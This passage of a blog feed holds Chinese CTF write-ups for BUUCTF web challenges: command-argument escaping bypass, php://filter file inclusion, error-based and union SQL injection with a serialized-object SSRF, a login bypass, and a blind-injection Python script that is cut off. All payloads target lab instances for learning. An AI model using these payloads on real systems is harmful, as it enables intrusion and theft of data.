src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/3.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> data伪协议 </tag>
            
            <tag> filter伪协议 </tag>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BUUCTF 2018]Online Tool</title>
      <link href="/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/"/>
      <url>/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><a href="1.jpg"></a><br>直接给出源代码，代码审计</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>_SERVER['HTTP_X_FORWARDED_FOR'],$_SERVER['REMOTE_ADDR']</code>，把用户IP设置为用户的x_forwarded_for<br>传入一个host参数，连续对host用<code>escapeshellarg和escapeshellcmd处理</code><br>这俩函数没见过，查一下</p><pre class=" language-bash"><code class="language-bash">escapeshellarg<span class="token punctuation">(</span><span class="token punctuation">)</span> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec<span class="token punctuation">(</span><span class="token punctuation">)</span>, system<span class="token punctuation">(</span><span class="token punctuation">)</span> 执行运算符 escapeshellcmd<span class="token punctuation">(</span><span class="token punctuation">)</span> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec<span class="token punctuation">(</span><span class="token punctuation">)</span> 或 system<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数，或者 执行操作符 之前进行转义</code></pre><p>这两个函数放在一起肯定会造成漏洞(不然为啥放在简短的源代码里)<br>果然可以查到这两个函数的漏洞<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><pre class=" language-bash"><code class="language-bash">传入的参数是：172.17.0.2<span class="token string">' -v -d a=1经过escapeshellarg处理后变成了'</span>172.17.0.2<span class="token string">'\''</span> -v -d a<span class="token operator">=</span>1<span class="token string">'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。经过escapeshellcmd处理后变成'</span>172.17.0.2<span class="token string">'\\'</span><span class="token string">' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php最后执行的命令是curl '</span>172.17.0.2<span class="token string">'\\'</span><span class="token string">' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'</span>没有被转义，与再后面的<span class="token string">'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'</span>，即向172.17.0.2\发起请求，POST 数据为a<span class="token operator">=</span>1' 它们在配合时并没有考虑到单引号带来的隐患                   </code></pre><p>就是说两次转义后单引号出问题了<br>再往下看，system会执行nmap的命令，扫描$host指定的机器<br>很显然我们需要利用nmap来做些什么</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 绕过escapeshellarg()+escapeshellcmd() </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]Secret File</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/1.jpg" alt=""><br>查看源代码，发现一个页面</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/2.jpg" alt=""><br>跳转过去<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/3.jpg" alt=""><br>点一下secret<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/4.jpg" alt=""><br>看到这个页面果断上burp<br>得到另一个页面<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/5.jpg" alt=""><br>跳转过去得到代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//flag放在了flag.php里</span><span class="token delimiter">?></span></code></pre><p>根据程序，我们要传入一个file参数为flag.php<br>然而却回显了这么一个页面<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/6.jpg" alt=""><br>有点懵<br>burp上查看一下<br>也没有<br>看看控制台的属性是不是设置成hidden了<br>同样也没有<br>真的气，到最后一步了却找不到flag<br>好久之后才想起来flag.php，一个php文件，那我们可以读它的源码啊</p><pre class=" language-bash"><code class="language-bash">http://22795964-60ec-4bea-9b8c-6b944c4ea759.node3.buuoj.cn/secr3t.php?file<span class="token operator">=</span>php://filter/convert.base64-encode/resource<span class="token operator">=</span>flag.php </code></pre><p>果然，返回了flag.php的base64编码，随后解码就可以得到flag<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/7.jpg" alt=""><br>哎，说到底还是太菜，经验也少</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/"/>
      <url>/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/1.jpg" alt=""><br>注册一个账号，登陆进去</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/2.jpg" alt=""><br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/3.jpg" alt=""><br>有一个<code>view.php?no=1</code>的页面，看起来可以sql注入<br>加个单引号测试<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/4.jpg" alt=""><br>报错<br>那么报错注入走一波</p><pre class=" language-bash"><code class="language-bash">?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'fakebook'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>data<span class="token punctuation">)</span> from users<span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+</code></pre><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/5.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/8.jpg" alt=""><br>可以看到用户信息的方式是序列化的<br>那接下来该怎么做，好像没了线索<br>emmmmmm<br>扫一波目录吧<br>果然扫到了好东西<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/9.jpg" alt=""><br>下载来看看</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>审计代码<br>定义了一个Userinfo类，属性就是我们注册时输入的那些<br>其中有一个get方法，接受一个url参数</p><pre class=" language-bash"><code class="language-bash">resource curl_init <span class="token punctuation">(</span><span class="token punctuation">[</span> string <span class="token variable">$url</span> <span class="token operator">=</span> NULL <span class="token punctuation">]</span> <span class="token punctuation">)</span>初始化一个新的会话，返回一个cURL句柄，供curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>, curl_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>和curl_close<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数使用url如果提供了该参数，CURLOPT_URL 选项将会被设置成这个值。你也可以使用curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>函数手动地设置这个值</code></pre><p>实例</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 创建一个新cURL资源</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置URL和相应的选项</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.runoob.com/");</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 抓取URL并把它传递给浏览器</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 关闭cURL资源，并且释放系统资源</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>所以get方法实质上就是返回我们请求的url的页面<br>而下面的的getBlogContents方法则是调用了get方法来请求我们输入的blog<br>即存在SSRF漏洞<br>结合数据存储的方式，我们猜测网站是通过读取用户blog字段，也就是url字段来加载的<br>而在之前的报错注入当中已经爆出了网站的绝对路径<br>我们可以构造blog字段为flag.php的绝对路径来读取flag</p><pre><code>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</code></pre><p>curl不仅支持http，https协议，还支持file协议，我们可以通过file协议来读取flag.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"L"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span></code></pre><p>构造sql语句如下</p><pre class=" language-bash"><code class="language-bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no<span class="token operator">=</span>-1/**/union/**/select/**/1,2,3,<span class="token string">'O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</span>--+</code></pre><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/10.jpg" alt=""><br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/11.jpg" alt=""><br>有一串base64字符串，解码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/12.jpg" alt=""><br>得到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP反序列化 </tag>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]EasySQL</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/</url>
      
        <content type="html"><![CDATA[<p>打开环境，登录框<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/1.jpg" alt=""><br>随便登陆测试一下</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/2.jpg" alt=""><br>不出意外的失败<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/3.jpg" alt=""><br>登陆框的sql语句大概就是<br><code>select * from table where username='$username' and password='$password'</code><br>那么万能密码先走一波<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/4.jpg" alt=""><br>构造成<br><code>select * from table where username='admin' or 1=1#' and password='123'</code><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/5.jpg" alt=""><br>成功</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> sql万能密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]Havefun</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/1.jpg" alt=""></p><a id="more"></a><p>查看源代码，在最末端发现提示<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/3.jpg" alt=""><br>基础，传参cat=dog即可<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/4.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack World</title>
      <link href="/LawlietLW.github.io/2020/02/09/hack-world/"/>
      <url>/LawlietLW.github.io/2020/02/09/hack-world/</url>
      
        <content type="html"><![CDATA[<p>打开环境，很明显就是sql注入<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/1.jpg" alt=""><br>输入几个数字测试一下</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/hack-world/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/4.jpg" alt=""><br>3以后就没有不同的回显了<br>接着测试单引号，输入1’测试<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/5.jpg" alt=""><br>回显<code>bool(false)</code><br>看到bool自然就想到bool盲注，不过我们还得fuzz一下过滤了哪些关键字，直接上bp测试<br>长度为472的都是bool，长度为482的都被探测为sql注入<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/8.jpg" alt=""><br>可以看到大部分注入需要的函数都没有被过滤<br>接下来就开始构造payload注入<br>题目已经告诉我们flag所在的表和列都为flag<br>我们构造如下payload惊醒测试<br><code>if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)--+</code><br>如果为真则返回id=1的结果，否则返回id=2的结果<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/9.jpg" alt=""><br>如预期一样，回显了id=1的结果<br>剩下的就是构造盲注脚本了，脚本可以用二分法，这样快很多<br>不过我懒，选择暴力枚举，脚本如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://8c21b6a5-81a5-4dc0-ac52-8db6ef8583f4.node3.buuoj.cn/index.php"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">"id"</span><span class="token punctuation">:</span>payload        <span class="token punctuation">}</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span 